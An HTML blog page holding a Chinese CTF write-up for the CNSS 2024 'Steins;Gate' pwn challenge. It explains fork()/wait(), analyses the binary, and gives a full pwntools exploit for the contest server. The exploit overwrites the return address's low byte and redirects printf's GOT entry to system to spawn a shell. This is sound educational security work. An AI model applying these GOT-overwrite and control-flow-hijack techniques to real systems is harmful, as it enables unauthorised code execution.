<!DOCTYPE html> <html lang="cn"> <head> <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <title> CNSS2024夏令营'命运石之门'writeup | Leak Box 258 </title> <meta name="author" content="Leak Box 258"> <meta name="description" content="A simple, whitespace theme for academics. Based on [*folio](https://github.com/bogoli/-folio) design. "> <meta name="keywords" content="PL, Rust, C++, Linux"> <link rel="stylesheet" href="/assets/css/bootstrap.min.css?a4b3f509e79c54a512b890d73235ef04"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous"> <link defer rel="stylesheet" href="/assets/css/academicons.min.css?f0b7046b84e425c55f3463ac249818f5"> <link defer rel="stylesheet" href="/assets/css/scholar-icons.css?62b2ac103a88034e6882a5be5f3e2772"> <link defer rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons&amp;display=swap"> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-github.css?591dab5a4e56573bf4ef7fd332894c99" media="" id="highlight_theme_light"> <link rel="shortcut icon" href="data:image/svg+xml,&lt;svg%20xmlns=%22http://www.w3.org/2000/svg%22%20viewBox=%220%200%20100%20100%22&gt;&lt;text%20y=%22.9em%22%20font-size=%2290%22&gt;%E2%99%BF%EF%B8%8F&lt;/text&gt;&lt;/svg&gt;"> <link rel="stylesheet" href="/assets/css/main.css?d41d8cd98f00b204e9800998ecf8427e"> <link rel="canonical" href="https://leakbox258.github.io/blog/2024/writeup-of-Steins;Gate/"> <script src="/assets/js/theme.js?a81d82887dd692e91686b43de4542f18"></script> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-native.css?5847e5ed4a4568527aa6cfab446049ca" media="none" id="highlight_theme_dark"> <script>
    initTheme();
  </script> </head> <body class="fixed-top-nav "> <header> <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top" role="navigation"> <div class="container"> <a class="navbar-brand title font-weight-lighter" href="/"> <span class="font-weight-bold">Leak</span> Box 258 </a> <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar top-bar"></span> <span class="icon-bar middle-bar"></span> <span class="icon-bar bottom-bar"></span> </button> <div class="collapse navbar-collapse text-right" id="navbarNav"> <ul class="navbar-nav ml-auto flex-nowrap"> <li class="nav-item "> <a class="nav-link" href="/">about </a> </li> <li class="nav-item active"> <a class="nav-link" href="/blog/">blog </a> </li> <li class="nav-item "> <a class="nav-link" href="/repositories/">repositories </a> </li> <li class="nav-item "> <a class="nav-link" href="/books/">bookshelf </a> </li> <li class="nav-item dropdown "> <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">submenus </a> <div class="dropdown-menu dropdown-menu-right" aria-labelledby="navbarDropdown"> <a class="dropdown-item " href="/books/">bookshelf</a> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/blog/">blog</a> </div> </li> <li class="nav-item"> <button id="search-toggle" title="Search" onclick="openSearchModal()"> <span class="nav-link">ctrl k <i class="ti ti-search"></i></span> </button> </li> <li class="toggle-container"> <button id="light-toggle" title="Change theme"> <i class="ti ti-sun-moon" id="light-toggle-system"></i> <i class="ti ti-moon-filled" id="light-toggle-dark"></i> <i class="ti ti-sun-filled" id="light-toggle-light"></i> </button> </li> </ul> </div> </div> </nav> <progress id="progress" value="0"> <div class="progress-container"> <span class="progress-bar"></span> </div> </progress> </header> <div class="container mt-5" role="main"> <div class="post"> <header class="post-header"> <h1 class="post-title">CNSS2024夏令营'命运石之门'writeup</h1> <p class="post-meta"> Created on September 06, 2024 by 久菜合子 </p> <p class="post-tags"> <a href="/blog/2024"> <i class="fa-solid fa-calendar fa-sm"></i> 2024 </a>   ·   <a href="/blog/tag/ctf"> <i class="fa-solid fa-hashtag fa-sm"></i> CTF</a>   <a href="/blog/tag/pwn"> <i class="fa-solid fa-hashtag fa-sm"></i> pwn</a>   <a href="/blog/tag/%E6%B0%B4"> <i class="fa-solid fa-hashtag fa-sm"></i> 水</a> </p> </header> <article class="post-content"> <div id="markdown-content"> <h3 id="step0-题目信息"><strong>Step0 题目信息</strong></h3> <p>        <img src="https://vip.helloimg.com/i/2024/08/31/66d284e2dd66c.png" alt="pwn1.png">  初始分数为1000分<br>        <img src="https://vip.helloimg.com/i/2024/08/31/66d284e82859a.png" alt="pwn2.png" style="zoom: 33%;">  如你所见，没有任何hint，从描述上也看不出所以然<br>  </p> <h3 id="step1-文件检查"><strong>Step1 文件检查</strong></h3> <h4 id="获取附件"> 获取附件:</h4> <p>   attachment：<strong><em><a href="https://github.com/3033680748/3033680748.github.io/blob/main/attachments/Steins%3BGate/attachment" rel="external nofollow noopener" target="_blank">elf可执行文件</a></em></strong><br>    libc：<strong><em><a href="https://github.com/3033680748/3033680748.github.io/blob/main/attachments/Steins%3BGate/libc.so.6" rel="external nofollow noopener" target="_blank">libc.so.6</a></em></strong><br>    ld：无<br></p> <h4 id="检查attachment文件"> 检查attachment文件：</h4> <p>   <img src="https://vip.helloimg.com/i/2024/08/31/66d284e7a83ae.png" alt="info1.png">    64位小端序可执行文件，动态链接，符号表保留<br>    got表可写，没有栈溢出保护，堆栈不可执行，无pie；后续静态分析未发现沙箱保护<br></p> <h4 id="配置本地调试环境"> 配置本地调试环境：</h4> <p>   略，因为缺少链接器ld，而且远程版本未知<br></p> <h3 id="step15-补充一点前置知识"><strong>Step1.5 补充一点前置知识</strong></h3> <p>      个人理解，可以先跳过这一部分内容<br></p> <h4 id="fork函数"> fork()函数：</h4> <p>   用于在程序执行中生成另一个进程（子进程）<br>   从fork()函数产生的效果来看，fork()最大的特点在于不需要指定子进程如何运行，子进程的内存布局和内容与父进程完全一致，无论数据还是指令，并且子进程的执行流会jmp到fork()之后。<br>   在父进程中，fork()将返回子进程的pid；在子进程中，则会返回0<br>   有关fork()的具体逻辑可以参考<a href="https://blog.csdn.net/cckluv/article/details/109169941" rel="external nofollow noopener" target="_blank">Linux系统——fork()函数详解(看这一篇就够了！！！)</a>，可以重点关注一下<strong>写时拷贝技术</strong>的内容。<br>   子进程和父进程既然有一样的内存，也就保存了一些共同的关键信息，如canary、aslr和pie的偏移等。此时就可以尝试破解出这些信息，即使这些操作会造成子进程异常退出，也不会影响父进程，反之亦然，只需要有一个进程getshell任务就算完成了。</p> <h4 id="wait函数"> wait()函数：</h4> <p>   当程序步入wait()函数后，会暂停执行，等到有特定信号或者<strong>子进程</strong>退出时，才会继续执行剩余的指令<br>   特别了解一下wait(0)的使用，它会使父进程等待子进程的退出，而且不论是正常退出还是异常退出<br></p> <h3 id="step2-使用-那个女人-pro-83-静态分析"><strong>Step2 使用 “那个女人 Pro 8.3” 静态分析</strong></h3> <h4 id="概况"> 概况</h4> <p>            <img src="https://vip.helloimg.com/i/2024/08/31/66d284e2b5779.png" alt="ida1.png">                got表里又出现了最爱的system<br></p> <h4 id="main函数"> main函数</h4> <p>​ <img src="https://vip.helloimg.com/i/2024/08/31/66d284e29ebcc.png" alt="ida_main.png" style="zoom: 80%;">    <strong>3~5</strong>： 关闭缓冲<br>    <strong>6</strong>： timeline(bss: 0x4040B0) = 0<br>    <strong>7</strong>: 调用fork()，并且将进程号存放在pid(bss: 0x4040C0)中 <br>    <strong>8~19</strong>: 按照fork()的返回值来判断，子进程将执行timeMachine()，父进程将在20行等待子进程退出。<br>    <strong>22</strong>： printf(Dest)，其中Dest(bss: 0x4040B8)，很明显的格式化字符串漏洞（真的吗？)<br></p> <h4 id="timemachine"> timeMachine()</h4> <p>​ <img src="https://vip.helloimg.com/i/2024/08/31/66d284e2aa4f5.png" alt="ida_timeMachine.png" style="zoom:80%;">    <strong>5~6</strong>: 当timeline(bss: 0x40040B0)为0时进入setDest()<br>    <strong>7~8</strong>: 注意read()的第二个参数，先将Dest转换为_QWORD*（unsigned long long*）类型，然后取值并加上timeline，结果作为指针；从标准输入读入一字节，写入这个指针指向的位置<br>    <strong>9</strong>: ++timeline自增<br>    <strong>11</strong>： 向buf中读入0x19, 发现0x19 = 0x10 + 0x8 + 0x1，可以覆盖栈帧的ret_addr的最低一位<br>    <strong>ps</strong>：当timeMachine()正常返回时，回到main(): 12，循环打印”I FAILED”<br></p> <h4 id="setdest"> setDest()</h4> <p>      <img src="https://vip.helloimg.com/i/2024/08/31/66d284e28e610.png" alt="ida_setDest.png">    <strong>3~4</strong>： 向Dest(bss: 0x4040B8)中写入，根据打印字符串的提示和上面分析可知，这里我们应该输入某个位置，这个位置中的值将在timeMachine()中被修改。<br></p> <h4 id="baddoor"> baddoor()</h4> <p>      <img src="https://vip.helloimg.com/i/2024/08/31/66d2bd54a8516.png" alt="ida_baddoor.png">    啥也不是，仅仅是提供了system()，”/bin/su”位于.rodata段没法修改<br></p> <h3 id="step3-漏洞分析"><strong>Step3 漏洞分析</strong></h3> <h4 id="存在以下可以利用漏洞"> 存在以下可以利用漏洞：</h4> <p>   timeMachine()::11处栈溢出，并且由于-no-pie，代码段固定，可以控制ret_addr的最低一位，劫持控制流。从ida中可知ret_addr可劫持为0x4012XX, 这个范围包含setDest()全部和main()::17（不包括）之前的内容，可以借助main()中的内容启动main()::6的fork()以及main()::11的timeMachine()<br>    setDest()::4以及timeMachine()::8实现了任意地址写，借助全局变量timeline的自增和劫持控制流可以实现从目标位置开始一个一个字节的修改<br>    main()::22，看起来像是一个格式化字符串的漏洞<br></p> <h4 id="利用方案"> 利用方案：</h4> <p>   首先论证一下main()::22的printf(Dest)到底是不是格式化字符串漏洞<br>    注意到控制流可以劫持到main()::15处，而这个判断在程序正常时几乎不会为真，所以会跳出然后到达main()::22处；或者劫持到main()::6处开子进程，此时也会到达main()::22处。简而言之，任何一个进程都可以利用这里的漏洞。<br>    如果利用printf(Dest)，要么为了泄露libc，要么为了任意地址写。本题got表中有system()，如果只是为了’/bin/sh’就泄露libc显得小题大做，而且栈溢出长度也不够ROP；<br>    然后是任意地址写，先暂时不提已经有更简单的任意地址写的方法，当printf完成任意地址写之后，子进程退出，父进程丝毫没有收到影响，所以任意地址写是做不到的。v    综上printf(Dest)作为格式化字符串用处不大v         由于已有system()，可以考虑去调用system()来getshell，但是首先找不到’sh’（fflush也没有），其次缺乏传参手段。<br>    此时main()::22发挥了用处，我们完全可以向Dest写入’/bin/sh\x00’，然后修改printf()的got表为system()，此时main()::22就相当于system(“/bin/sh\0”)    检查got表<img src="https://vip.helloimg.com/i/2024/08/31/66d2c8d71697e.png" alt="got.png"><br>    由于延迟绑定技术，函数的got分别指向了自己的plt，注意到两者plt只有一个字节的区别，所以timeMachine()中修改一次即可。<br>    此时timeline = 1，无法调用setDest()，所以劫持到main()::6，顺便进入一个新的进程，新的进程复制了父进程的内存，包括篡改的内容<br></p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">## step 1
</span><span class="n">io</span><span class="p">.</span><span class="nf">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">Input the Destination:</span><span class="se">\n</span><span class="sh">'</span><span class="p">,</span> <span class="nf">p64</span><span class="p">(</span><span class="n">printf_got</span><span class="p">))</span> <span class="c1"># Dest -&gt; printf_got
</span>
<span class="n">io</span><span class="p">.</span><span class="nf">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">Input the impact:</span><span class="sh">'</span><span class="p">,</span> <span class="nf">p8</span><span class="p">(</span><span class="mh">0x40</span><span class="p">))</span> <span class="c1"># printf_got -&gt; system_plt
</span><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="o">*</span><span class="mh">0x18</span> <span class="o">+</span> <span class="nf">p8</span><span class="p">(</span><span class="mh">0xab</span><span class="p">)</span> <span class="c1"># rip -&gt; time = 0 ; call fork()
</span><span class="n">io</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</code></pre></div></div> <p>   向Dest处写上”/bin/sh\0”<br>    此时还有一个问题，”/bin/sh\0”不一定是一个可写的地址，为了验证read()的反应，这里写一个demo<br></p> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
        <span class="kt">char</span> <span class="o">*</span><span class="n">dead</span> <span class="o">=</span> <span class="s">"/bin/sh</span><span class="se">\0</span><span class="s">"</span><span class="p">;</span>
        <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="o">*</span><span class="n">dead</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">"I'm alive !"</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

</code></pre></div></div> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Desktop]
└─<span class="nv">$ </span>gcc test.c <span class="nt">-o</span> <span class="nb">test
</span>test.c: In <span class="k">function</span> ‘main’:
test.c:7:17: warning: cast to pointer from integer of different size <span class="o">[</span><span class="nt">-Wint-to-pointer-cast</span><span class="o">]</span>
    7 |         <span class="nb">read</span><span class="o">(</span>0, <span class="o">(</span>void <span class="k">*</span><span class="o">)</span><span class="k">*</span>dead, 1<span class="o">)</span><span class="p">;</span>
      |                 ^

┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Desktop]
└─<span class="nv">$ </span>./test            
s
I<span class="s1">'m alive !
</span></code></pre></div></div> <p>   虽然gcc报了warning，但不影响编译，而且read()表示我没意见，于是没有抛出错误<br>    这里还有一个小细节值得注意，demo中输入了’s’，但这只是为了方便展示，实际上read()并没有读入’s’，read()只是在等回车结束stdin（可能说法不太准确），也就是<strong>我开stdin != 我读入字符</strong>，这一处卡了本人快2个小时。<br>    布置好system(“/bin/sh\0”)之后，我们再fork()一次<br></p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">## step2
</span><span class="n">io</span><span class="p">.</span><span class="nf">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">Input the Destination:</span><span class="se">\n</span><span class="sh">'</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">/bin/sh</span><span class="se">\0</span><span class="sh">'</span><span class="p">)</span> <span class="c1"># Dest -&gt; "/bin/sh\0"
</span><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="o">*</span><span class="mh">0x18</span> <span class="o">+</span> <span class="nf">p8</span><span class="p">(</span><span class="mh">0xb5</span><span class="p">)</span> <span class="c1"># call fork()
##io.sendafter(b'Input the impact:', b's') # 不需要发送字符，否则会占用payload的读入长度
</span><span class="n">io</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</code></pre></div></div> <p>   此时上一个线程卡在main()::20，wait(0LL)，我们想办法让新开的子线程结束，就可以getshell<br></p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">## step3
</span><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="o">*</span><span class="mh">0x18</span> <span class="o">+</span> <span class="nf">p8</span><span class="p">(</span><span class="mh">0x48</span><span class="p">)</span> <span class="c1"># 0x401248 ret, ret到了一个非法地址，子程序退出
</span><span class="n">io</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</code></pre></div></div> <h3 id="step4-完整exp"><strong>Step4 完整exp</strong></h3> <p>   ps: libc.so.6全程旁观<br></p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="k">def</span> <span class="nf">debug</span><span class="p">(</span><span class="n">cmd</span><span class="o">=</span><span class="sh">''</span><span class="p">):</span>
    <span class="n">gdb</span><span class="p">.</span><span class="nf">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">cmd</span><span class="p">)</span>
    <span class="nf">pause</span><span class="p">()</span>

<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="sh">"</span><span class="s">debug</span><span class="sh">"</span>
<span class="c1">##io = process("./pwn")
</span><span class="n">io</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">152.136.11.155</span><span class="sh">"</span><span class="p">,</span> <span class="mi">10027</span><span class="p">)</span>
<span class="n">elf</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">"</span><span class="s">./pwn</span><span class="sh">"</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">"</span><span class="s">./libc.so.6</span><span class="sh">"</span><span class="p">)</span>

<span class="c1"># datas
</span><span class="n">printf_got</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="sh">"</span><span class="s">printf</span><span class="sh">"</span><span class="p">]</span> <span class="c1"># 0x404028
##system_got = elf.got["system"]
</span><span class="n">system_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">plt</span><span class="p">[</span><span class="sh">"</span><span class="s">system</span><span class="sh">"</span><span class="p">]</span>
<span class="n">timeline_pid</span> <span class="o">=</span> <span class="mh">0x4012AB</span>

<span class="c1"># Dest = 0x4040B8
</span><span class="n">io</span><span class="p">.</span><span class="nf">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">Input the Destination:</span><span class="se">\n</span><span class="sh">'</span><span class="p">,</span> <span class="nf">p64</span><span class="p">(</span><span class="n">printf_got</span><span class="p">))</span> <span class="c1"># Dest -&gt; printf_got
</span>
<span class="n">io</span><span class="p">.</span><span class="nf">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">Input the impact:</span><span class="sh">'</span><span class="p">,</span> <span class="nf">p8</span><span class="p">(</span><span class="mh">0x40</span><span class="p">))</span> <span class="c1"># printf_got -&gt; system_plt
</span><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="o">*</span><span class="mh">0x18</span> <span class="o">+</span> <span class="nf">p8</span><span class="p">(</span><span class="mh">0xab</span><span class="p">)</span> <span class="c1"># rip -&gt; time = 0 ; call fork()
</span><span class="n">io</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>


<span class="n">io</span><span class="p">.</span><span class="nf">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">Input the Destination:</span><span class="se">\n</span><span class="sh">'</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">/bin/sh</span><span class="se">\0</span><span class="sh">'</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="o">*</span><span class="mh">0x18</span> <span class="o">+</span> <span class="nf">p8</span><span class="p">(</span><span class="mh">0xb5</span><span class="p">)</span> <span class="c1"># call fork()
##io.sendafter(b'Input the impact:', b's') # s
</span><span class="n">io</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="o">*</span><span class="mh">0x18</span> <span class="o">+</span> <span class="nf">p8</span><span class="p">(</span><span class="mh">0x48</span><span class="p">)</span> <span class="c1"># 0x401248 ret
</span><span class="n">io</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

<span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>

</code></pre></div></div> </div> </article> <br> <hr> <br> <ul class="list-disc pl-8"></ul> <h2 class="text-3xl font-semibold mb-4 mt-12">Enjoy Reading This Article?</h2> <p class="mb-2">Here are some more articles you might like to read next:</p> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="https://blog.google/technology/ai/google-gemini-update-flash-ai-assistant-io-2024/" target="_blank" rel="external nofollow noopener">Google Gemini updates: Flash 1.5, Gemma 2 and Project Astra</a> <svg width="1rem" height="1rem" viewbox="0 0 30 30" xmlns="http://www.w3.org/2000/svg"> <path d="M17 13.5v6H5v-12h6m3-3h6v6m0-6-9 9" class="icon_svg-stroke" stroke="#999" stroke-width="1.5" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"></path> </svg> </li> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="https://medium.com/@al-folio/displaying-external-posts-on-your-al-folio-blog-b60a1d241a0a?source=rss-17feae71c3c4------2" target="_blank" rel="external nofollow noopener">Displaying External Posts on Your al-folio Blog</a> <svg width="1rem" height="1rem" viewbox="0 0 30 30" xmlns="http://www.w3.org/2000/svg"> <path d="M17 13.5v6H5v-12h6m3-3h6v6m0-6-9 9" class="icon_svg-stroke" stroke="#999" stroke-width="1.5" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"></path> </svg> </li> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/blog/2025/ONNX/">ONNX-opt day0</a> </li> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/blog/2025/%E5%86%85%E6%A0%B8%E6%A8%A1%E5%9D%97%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E5%8F%8A%E8%B0%83%E8%AF%95/">内核模块开发环境及调试</a> </li> <li class="my-2"> <a class="text-pink-700 underline font-semibold hover:text-pink-800" href="/blog/2025/C++%E6%80%8E%E4%B9%88UAF/">[水贴]C++应该怎么UAF</a> </li> </div> </div> <footer class="fixed-bottom" role="contentinfo"> <div class="container mt-0"> © Copyright 2025 Leak Box 258. Powered by <a href="https://jekyllrb.com/" target="_blank" rel="external nofollow noopener">Jekyll</a> with <a href="https://github.com/alshedivat/al-folio" rel="external nofollow noopener" target="_blank">al-folio</a> theme. Hosted by <a href="https://pages.github.com/" target="_blank" rel="external nofollow noopener">GitHub Pages</a>. Photos from <a href="https://unsplash.com" target="_blank" rel="external nofollow noopener">Unsplash</a>. </div> </footer> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script> <script src="/assets/js/bootstrap.bundle.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/imagesloaded@5.0.0/imagesloaded.pkgd.min.js" integrity="sha256-htrLFfZJ6v5udOG+3kNLINIKh2gvoKqwEhHYfTTMICc=" crossorigin="anonymous"></script> <script defer src="/assets/js/masonry.js?a0db7e5d5c70cc3252b3138b0c91dcaf" type="text/javascript"></script> <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js" integrity="sha256-ZgMyDAIYDYGxbcpJcfUnYwNevG/xi9OHKaR/8GK+jWc=" crossorigin="anonymous"></script> <script defer src="/assets/js/zoom.js?85ddb88934d28b74e78031fd54cf8308"></script> <script src="/assets/js/no_defer.js?2781658a0a2b13ed609542042a859126"></script> <script defer src="/assets/js/common.js?e0514a05c5c95ac1a93a8dfd5249b92e"></script> <script defer src="/assets/js/copy_code.js?c8a01c11a92744d44b093fc3bda915df" type="text/javascript"></script> <script defer src="/assets/js/jupyter_new_tab.js?d9f17b6adc2311cbabd747f4538bb15f"></script> <script async src="https://d1bxh8uas1mnw7.cloudfront.net/assets/embed.js"></script> <script async src="https://badge.dimensions.ai/badge.js"></script> <script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-mml-chtml.js" integrity="sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI=" crossorigin="anonymous"></script> <script src="/assets/js/mathjax-setup.js?a5bb4e6a542c546dd929b24b8b236dfd"></script> <script defer src="https://cdnjs.cloudflare.com/polyfill/v3/polyfill.min.js?features=es6" crossorigin="anonymous"></script> <script defer src="/assets/js/progress-bar.js?2f30e0e6801ea8f5036fa66e1ab0a71a" type="text/javascript"></script> <script src="/assets/js/vanilla-back-to-top.min.js?f40d453793ff4f64e238e420181a1d17"></script> <script>
    addBackToTop();
  </script> <script type="module" src="/assets/js/search/ninja-keys.min.js?a3446f084dcaecc5f75aa1757d087dcf"></script> <ninja-keys hidebreadcrumbs noautoloadmdicons placeholder="Type to start searching"></ninja-keys> <script src="/assets/js/search-setup.js?6c304f7b1992d4b60f7a07956e52f04a"></script> <script src="/assets/js/search-data.js"></script> <script src="/assets/js/shortcut-key.js?6f508d74becd347268a7f822bca7309d"></script> </body> </html>